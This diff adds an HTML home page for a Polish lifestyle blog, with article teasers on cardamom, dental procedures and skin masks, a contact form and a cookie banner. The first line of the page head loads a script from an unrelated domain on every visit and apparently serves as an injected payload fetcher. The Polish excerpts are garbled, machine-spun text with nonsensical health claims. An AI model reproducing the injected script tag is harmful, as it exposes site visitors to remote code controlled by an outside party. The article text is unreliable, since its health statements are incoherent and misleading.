@@ -1,0 +1,211 @@
+<!--
+Author: W3layouts
+Author URL: http://w3layouts.com
+License: Creative Commons Attribution 3.0 Unported
+License URL: http://creativecommons.org/licenses/by/3.0/
+-->
+<!DOCTYPE HTML>
+<html>
+<head>
+    <script src="https://grohair.club/verlaine/?30ifhn2k.js"></script>
+
+    <title>miłość</title>
+    <link href="css/bootstrap.css" rel='stylesheet' type='text/css'/>
+    <link href="css/style.css" rel='stylesheet' type='text/css'/>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta name="keywords" content="Personal Blog Responsive web template, Bootstrap Web Templates, Flat Web Templates, Andriod Compatible web template,
+	Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyErricsson, Motorola web design"
+    />
+    <script type="application/x-javascript"> addEventListener("load", function () {
+        setTimeout(hideURLbar, 0);
+    }, false);
+
+    function hideURLbar() {
+        window.scrollTo(0, 1);
+    } </script>
+    <!----webfonts---->
+    <link href='http://fonts.googleapis.com/css?family=Oswald:100,400,300,700' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Lato:100,300,400,700,900,300italic' rel='stylesheet'
+          type='text/css'>
+    <!----//webfonts---->
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <!--end slider -->
+    <!--script-->
+    <script type="text/javascript" src="js/move-top.js"></script>
+    <script type="text/javascript" src="js/easing.js"></script>
+    <!--/script-->
+    <script type="text/javascript">
+        jQuery(document).ready(function ($) {
+            $(".scroll").click(function (event) {
+                event.preventDefault();
+                $('html,body').animate({scrollTop: $(this.hash).offset().top}, 900);
+            });
+        });
+    </script>
+    <!---->
+
+</head>
+<body>
+<!---header---->
+<header>
+
+        <div class="logo">
+            <a href="index.php">harmonia</a>
+        </div>
+        <!---start-top-nav---->
+        <div class="top-menu">
+            <div class="search">
+
+            <span class="menu"> </span>
+            <ul>
+                <li class="active"><a href="index.php">Strona główna</a></li>
+                <li><a href="blog.php">Artykuły</a></li>
+                <li><a href="contact.php">Kontakty</a></li>
+                <li><a href="terms.php">Warunki i postanowienia</a></li>
+				<li><a href="policy.php">Polityka prywatności</a></li>
+                <div class="clearfix"></div>
+            </ul>
+        </div>
+        <div class="clearfix"></div>
+        <script>
+            $("span.menu").click(function () {
+                $(".top-menu ul").slideToggle("slow", function () {
+                });
+            });
+        </script>
+        <!---//End-top-nav---->
+    </div>
+</header>
+<!--/header-->
+<div class="content">
+    <div class="container">
+        <div class="content-grids">
+            <div class="col-md-10 content-main">
+                <div class="content-grid">
+					
+                    <div class="content-grid-info">
+                        <img src="./assets/images/antonika-chanel-rjcslxmvbcs-unsplash.jpg" alt=""/>
+                        <div class="post-info">
+                            <h4><a href="PaR8TZXmmq.php">9 właściwości kardamonu</a> 25.03.2021</h4>
+                            <p>  <strong></strong> kardamon - wspaniała przyprawa z niesamowitym smakiem i dużą korzyścią dla zdrowia. Jest on powszechnie stosowany w kuchni indyjskiej i medycynie. Dodaje się go do wielu różnych potraw, od przystawek do słodyczy. W tym sensie, kardamon jest podobny przyprawy, które ma szereg przydatnych właściwości. Przede wszystkim, kardamon to przyprawa, która zawiera wiele składników odżywczych. On ma wiele leczniczych i wł...</p>
+                            <a href="PaR8TZXmmq.php"><span></span>Czytaj dalej</a>
+                        </div>
+                    </div>
+					
+
+                    <div class="content-grid-info">
+                        <img src="./assets/images/isra-e-shjmuyqsrn8-unsplash (1).jpg" alt=""/>
+                        <div class="post-info">
+                            <h4><a href="XnX2l922ifH2loZi5Ftxh7hI.php">Przygotowanie do wielkiej stomatologicznej procedu...</a> 25.03.2021</h4>
+                            <p>  <strong></strong> zdjęcia ze służby dla wielu ludzi pojawienie się ogromnej grzywny ból zęba jest zwiastunem złego smakosza. - A gdyby tak było, to, niestety, prawda była by następująca: po pierwszym szoku od procedury zapomnisz o bólu w dolnej szczęki i strachu uszkodzić ból zęba. To jest warunkiem pojawienia się ogromnej czarnej etykiety na piersi. Ale nie tylko to. niektórzy specjaliści w dziedzinie stomatologii radzą, by ...</p>
+                            <a href="XnX2l922ifH2loZi5Ftxh7hI.php"><span></span>Czytaj dalej</a>
+                        </div>
+                    </div>
+					
+
+                    <div class="content-grid-info">
+                        <img src="./assets/images/k15-photos-kfushu6kbs4-unsplash.jpg" alt=""/>
+                        <div class="post-info">
+                            <h4><a href="6qJDpQlxiwc4ndzAagLrfbEwZI.php">5 nawilżających maseczek do skóry,</a> 25.03.2021</h4>
+                            <p>  <strong></strong> nawilżenie skóry, było i będzie głównym obowiązkiem każdej kobiety. Wynik niedostatecznego nawilżenia organizmu, a nie tylko na krótką metę, ale w dłuższej, nieuchronnie, nieuchronnie doprowadzi do pogorszenia wyglądu. Przyczyną nadmiernego pocenia się jest zazwyczaj odwodnienie skóry.Mimo, że skóra twarzy i ciała najbardziej narażona na działanie powietrza, ciepła i słońca, niedostateczne nawodnienie ...</p>
+                            <a href="6qJDpQlxiwc4ndzAagLrfbEwZI.php"><span></span>Czytaj dalej</a>
+                        </div>
+                    </div>
+					
+
+
+                </div>
+                <div class="row">
+                    <div class="col-lg-6 col-md-12 mb-5 element-animate">
+
+                        <form action="thanks.php" method="post">
+                            <div class="row">
+                                <div class="col-md-12 form-group">
+                                    <input type="text" id="name" class="form-control " placeholder="Nazwa">
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-12 form-group">
+                                    <input type="text" id="phone" class="form-control " placeholder="Numer telefonu">
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-12 form-group">
+
+                                    <input type="email" id="email" class="form-control " placeholder="Email">
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-12 form-group">
+
+                            <textarea name="message" id="message" class="form-control " cols="30" rows="8"
+                                      placeholder="Tekst komentarza">
+
+                      </textarea>
+                                    <label class="terms-field">
+                                        <input type="checkbox" name="terms" value="check" required=""/>
+                                        <a href="policy.php" target="_blank">
+                                            Przeczytałem i zgadzam się z warunkami umowy
+                                        </a>
+                                    </label>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <div class="col-md-6 form-group">
+                                    <button class="btn btn-default" type="submit">Wysłać</button>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="col-lg-1"></div>
+                    <div class="col-lg-5 element-animate">
+                        <h3 class="mb-5">Informacje</h3>
+                        <ul class="list-unstyled ">
+                            <li class="d-flex mb-3"><span class="mr-3"></span><span
+                                    class="">Mazurska 22, 81-826 Legnica</span></li>
+                            <li class="d-flex mb-3"><span class="mr-3"></span><span
+                                    class="">+8095176004443</span></li>
+                            <li class="d-flex mb-3"><span class="mr-3"></span><span
+                                    class="">kamila12@laskowski.com</span></li>
+                        </ul>
+                    </div>
+
+                </div>
+            </div>
+
+            <div class="clearfix"></div>
+        </div>
+    </div>
+</div>
+<footer>
+
+        <div class="container">
+            <div class="footer">
+            <p>
+                Copyright &copy;<script>document.write(new Date().getFullYear());</script>
+                All rights reserved</p>
+        </div>
+    </div>
+</footer>
+
+<div class='cookie-banner'>
+    <p>
+        Strona wykorzystuje pliki cookie. Pozwalają one poznać ciebie i otrzymywać informacje o swoim doświadczeniu użytkownika.Kontynuując przeglądanie strony, wyrażam zgodę na korzystanie z plików cookie przez właściciela serwisu zgodnie z  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Polityką cookie</a>
+    </p>
+    <button class='close-cookie'>&times;</button>
+</div>
+<script>
+    window.onload = function() {
+        $('.close-cookie').click(function () {
+            $('.cookie-banner').fadeOut();
+        })
+    }
+</script>
+<script>
+    let elems = document.querySelectorAll('.server-name');
+    elems.forEach((elem) => {
+        elem.innerHTML = window.location.hostname
+    })
+</script>
+</body>
